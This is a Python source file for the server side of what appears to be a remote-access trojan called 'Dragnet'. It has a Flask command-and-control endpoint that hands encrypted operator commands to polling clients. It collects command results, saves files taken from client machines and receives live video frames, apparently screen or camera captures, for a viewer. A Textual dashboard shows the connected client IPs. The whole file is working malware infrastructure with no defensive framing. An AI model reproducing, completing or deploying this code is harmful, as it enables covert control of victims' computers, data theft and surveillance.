# server/server.py (Corrected Live Streaming Version)
import threading, queue, time, base64, os, hashlib, multiprocessing
from datetime import datetime, timedelta
from flask import Flask, request, jsonify
from waitress import serve
import psutil, logging
from textual.app import App, ComposeResult
from textual.widgets import Header, Footer, Input, Log, Static, DataTable
from textual.containers import VerticalScroll, Container
from textual.reactive import reactive
from textual.timer import Timer
from crypto_utils import encrypt, decrypt
from viewer import live_viewer_process 


log = logging.getLogger('werkzeug'); log.setLevel(logging.ERROR)
flask_app = Flask(__name__)
tasks = queue.Queue()
log_queue = queue.Queue()
clients = {}
DOWNLOADS_DIR = "downloads"

frame_queue = multiprocessing.Queue()
viewer_proc = None 


@flask_app.route('/submit/frame', methods=['POST'])
def submit_frame():
    """Receives a single video frame from a client."""
    frame_data = request.get_data()
    try:
        if not frame_queue.full():
            frame_queue.put(frame_data)
    except Exception:
        pass
    return "OK", 200


@flask_app.route('/get-task', methods=['POST'])
def get_task():
    client_ip = request.remote_addr; clients[client_ip] = {"last_seen": time.time()}
    if not tasks.empty(): return jsonify({"task": encrypt(tasks.get())})
    return jsonify({"task": "none"})
@flask_app.route('/submit-result', methods=['POST'])
def submit_result():
    data = request.json; decrypted_result = decrypt(data.get('result', ''))
    if decrypted_result.startswith("FILE_DOWNLOAD:"):
        save_downloaded_file(request.remote_addr, decrypted_result.split(":", 1)[1])
    else: log_queue.put(f"[+] Result from {request.remote_addr}:\n---\n{decrypted_result}\n---")
    return jsonify({"status": "ok"})
@flask_app.route('/submit-chat', methods=['POST'])
def submit_chat():
    data = request.json
    try:
        dec_msg = decrypt(data.get('message','')); ip_h = hashlib.md5(request.remote_addr.encode()).hexdigest()[:6]
        log_queue.put(f"[bold magenta][CHAT][/bold magenta] <Client-{ip_h}>: {dec_msg}")
    except Exception as e: log_queue.put(f"[!] Chat error: {e}")
    return jsonify({"status": "ok"})
def save_downloaded_file(client_ip, content):
    try:
        fname = f"{client_ip.replace('.', '_')}_{int(time.time())}.file"; fpath = os.path.join(DOWNLOADS_DIR, fname); decoded = base64.b64decode(content)
        with open(fpath, 'wb') as f: f.write(decoded)
        log_queue.put(f"[+] [green]File downloaded:[/green] {fpath}")
    except Exception as e: log_queue.put(f"[!] [red]File download failed:[/red] {e}")



class ServerApp(App):
    async def on_input_submitted(self, event: Input.Submitted) -> None:
        """Handles commands from the user."""
        global viewer_proc
        command = event.value.strip()
        if not command: return

        if command == "show-stream":
            if viewer_proc and viewer_proc.is_alive():
                log_queue.put("[!] [yellow]Viewer is already running.[/yellow]")
            else:
                log_queue.put("[*] [bold yellow]Launching Live Stream Viewer window...[/bold yellow]")
                viewer_proc = multiprocessing.Process(target=live_viewer_process, args=(frame_queue,))
                viewer_proc.start()
        else:
            tasks.put(command)
            log_queue.put(f"[*] Task '{command}' queued.")
        
        self.query_one(Input).value = ""

    
    CSS_PATH = None; BINDINGS = [("q", "quit", "Quit")]
    def compose(self) -> ComposeResult:
        yield Header(name="Dragnet - Remote Operations Dashboard");
        with Container():
            with VerticalScroll(id="left-pane"):
                yield Static("[bold]Server Status[/bold]", classes="header"); yield ServerStatus();
                yield Static("[bold]Connected Clients[/bold]", classes="header"); yield DataTable(id="client_table")
            with VerticalScroll(id="right-pane"):
                yield Static("[bold]Command Log[/bold]", classes="header"); yield Log(id="log_view", highlight=True)
        yield Input(placeholder="Enter command...", id="command_input"); yield Footer()
    def on_mount(self) -> None:
        table = self.query_one(DataTable); table.add_columns("Client IP", "Status", "Last Seen")
        self.update_log_timer: Timer = self.set_interval(0.2, self.update_logs)
        self.update_clients_timer: Timer = self.set_interval(2, self.update_client_table)
    def update_logs(self) -> None:
        if not log_queue.empty(): self.query_one(Log).write(log_queue.get())
    def update_client_table(self) -> None:
        table = self.query_one(DataTable); table.clear(); now = time.time()
        for ip, data in clients.items(): dt = datetime.fromtimestamp(data["last_seen"]); status = "[green]Active[/green]" if (now - data["last_seen"]) < 25 else "[yellow]Idle[/yellow]"; table.add_row(ip, status, dt.strftime("%Y-%m-%d %H:%M:%S"))

class ServerStatus(Static):
    cpu_percent = reactive(0.0); mem_percent = reactive(0.0); disk_percent = reactive(0.0); uptime = reactive(timedelta(0)); net_sent = reactive(0.0); net_recv = reactive(0.0)
    def on_mount(self) -> None: self.start_time = time.time(); self.last_net_io = psutil.net_io_counters(); self.last_update_time = time.time(); self.update_timer = self.set_interval(1, self.update_stats)
    def update_stats(self) -> None:
        self.uptime = timedelta(seconds=int(time.time() - self.start_time))
        self.cpu_percent = psutil.cpu_percent()
        self.mem_percent = psutil.virtual_memory().percent
        self.disk_percent = psutil.disk_usage('/').percent
        current_net_io = psutil.net_io_counters()
        current_time = time.time()
        elapsed_time = current_time - self.last_update_time
        if elapsed_time > 0:
            self.net_sent = (current_net_io.bytes_sent - self.last_net_io.bytes_sent) / elapsed_time
            self.net_recv = (current_net_io.bytes_recv - self.last_net_io.bytes_recv) / elapsed_time
        self.last_net_io = current_net_io
        self.last_update_time = current_time
    
    def format_bytes(self, byte_count: float) -> str:
        
        power = 1024
        n = 0
        power_labels = {0: 'B/s', 1: 'KB/s', 2: 'MB/s', 3: 'GB/s'}
        if byte_count is None:
            return "0.0 B/s"
        
        while byte_count >= power and n < len(power_labels) - 1:
            byte_count /= power
            n += 1
        return f"{byte_count:.1f} {power_labels[n]}"

    def render(self) -> str:
        cpu_chars = "  ▂▃▄▅▆▇█"; cpu_char_index = int(self.cpu_percent / 100 * (len(cpu_chars) - 1)); cpu_bar = cpu_chars[cpu_char_index] * 25
        mem_fill_count = int(self.mem_percent / 100 * 25); mem_bar = f"[#4279A8]{'|' * mem_fill_count}[/#4279A8][#223D54]{'·' * (25 - mem_fill_count)}[/]"
        disk_fill_count = int(self.disk_percent / 100 * 25); disk_bar = f"[#9E42A8]{'▓' * disk_fill_count}[/][#49224F]{'░' * (25 - disk_fill_count)}[/]"
        uptime_str = str(self.uptime); cpu_color = "green" if self.cpu_percent < 50 else "yellow" if self.cpu_percent < 80 else "red"; mem_color = "cyan" if self.mem_percent < 75 else "bright_red"
        return (f"[bold cyan]SYS_UPTIME: [/][white]{uptime_str}[/]\n[bold {cpu_color}]CORE_LOAD : [[/]{cpu_bar}[bold {cpu_color}]][/] {self.cpu_percent:>5.1f} %\n[bold {mem_color}]MEM_BANK  : [[/]{mem_bar}[bold {mem_color}]][/] {self.mem_percent:>5.1f} %\n[bold magenta]DATA_STORE: [[/]{disk_bar}[bold magenta]][/] {self.disk_percent:>5.1f} %\n[bold yellow]NET_FLUX  : [/]▲ {self.format_bytes(self.net_sent):<10} ▼ {self.format_bytes(self.net_recv):<10}")

def run_flask_server():
    if not os.path.exists(DOWNLOADS_DIR): os.makedirs(DOWNLOADS_DIR)
    serve(flask_app, host='0.0.0.0', port=5000)

if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask_server, daemon=True)
    flask_thread.start()
    app = ServerApp()
    app.run()
    
    if viewer_proc:
        frame_queue.put(None)
        viewer_proc.join()